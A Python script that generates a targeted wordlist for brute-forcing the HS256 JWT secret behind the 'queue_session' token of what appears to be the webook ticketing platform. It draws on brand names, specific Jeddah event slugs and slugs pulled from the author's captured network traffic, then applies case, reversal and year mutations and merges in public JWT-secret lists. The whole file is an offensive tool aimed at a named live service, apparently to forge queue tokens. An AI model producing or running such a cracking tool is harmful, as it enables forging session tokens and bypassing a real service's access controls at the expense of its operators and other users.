#!/usr/bin/env python3
"""
Generate a targeted wordlist for webook queue_session JWT HS256 secret.

The secret was not found in common wordlists (JWT secrets, xato, pwdb,
darkc0de, rockyou). This script builds context-derived candidates based on:
  - webook / wbk branding
  - queue system identifiers
  - event/season slugs from captures
  - common SaaS secret patterns
  - mutations (reversal, case, years, special chars)

Usage:
    python targeted-queue-wordlist.py > targeted-queue-secrets.txt
    python targeted-queue-wordlist.py --combine seclists-scraped-JWT-secrets.txt > combined.txt
"""

import argparse
import itertools
import os
import re


BASE_TERMS = [
    "webook", "wbk", "queue", "qsession", "qserv", "rs-queue", "backend-queue",
    "webook2024", "webook2025", "webook2026", "wbk2024", "wbk2025", "wbk2026",
    "webook_prod", "webook-prod", "wbk_prod", "wbk-prod",
    "webook_secret", "webook-secret", "wbk_secret", "wbk-secret",
    "webook_key", "webook-key", "wbk_key", "wbk-key",
    "queue_secret", "queue-secret", "queue_key", "queue-key",
    "session_secret", "session-secret", "jwt_secret", "jwt-secret",
    "ramy-sabry-jeddah-concert-2026-tickets",
    "this-is-michael-musical-show-jeddah-ticket",
]

SUFFIXES = [
    "", "123", "1234", "2024", "2025", "2026", "!", "!!", "@", "#",
    "_prod", "_dev", "_staging", "_key", "_secret", "_token",
    "-prod", "-dev", "-staging", "-key", "-secret", "-token",
]

TRANSFORMS = [
    lambda s: s,
    lambda s: s.lower(),
    lambda s: s.upper(),
    lambda s: s.capitalize(),
    lambda s: s[::-1],
    lambda s: s[::-1].lower(),
]


def extract_slugs_from_captures():
    """Pull event slugs from saved captures."""
    slugs = set()
    files = [
        "diagnose-queue-output/network.json",
        "diagnose-queue-output/01_initial.json",
        "diagnose-queue-output/02_after_login.json",
    ]
    pattern = re.compile(r"/events/([a-zA-Z0-9_-]+)")
    for path in files:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
            for m in pattern.finditer(text):
                slugs.add(m.group(1))
        except Exception:
            pass
    return sorted(slugs)


def generate_candidates():
    candidates = set()

    # Base term mutations
    terms = list(BASE_TERMS)
    terms.extend(extract_slugs_from_captures())

    for term in terms:
        for transform in TRANSFORMS:
            base = transform(term)
            if not base:
                continue
            candidates.add(base)
            for suffix in SUFFIXES:
                candidates.add(base + suffix)
                candidates.add(suffix + base)

    # Common vendor/JWT framework defaults
    defaults = [
        "your-256-bit-secret", "mysecret", "secret", "secretkey",
        "supersecret", "changeme", "password", "admin", "test",
        "node", "edon", "nodejs", "express", "nestjs", "laravel",
        "webook_queue_secret", "webook_queue_key",
    ]
    for d in defaults:
        candidates.add(d)
        for suffix in ("", "123", "2024", "2025", "2026", "_prod", "-prod"):
            candidates.add(d + suffix)

    # Remove obvious garbage and very long entries
    cleaned = set()
    for c in candidates:
        c = c.strip()
        if 1 <= len(c) <= 128:
            cleaned.add(c)

    return sorted(cleaned)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--combine", help="Also include entries from another wordlist")
    args = parser.parse_args()

    candidates = generate_candidates()

    if args.combine and os.path.exists(args.combine):
        with open(args.combine, "r", encoding="utf-8", errors="ignore") as f:
            candidates.extend(line.rstrip("\n\r") for line in f if line.strip())

    # Deduplicate while preserving order
    seen = set()
    for c in candidates:
        if c not in seen:
            seen.add(c)
            print(c)


if __name__ == "__main__":
    main()
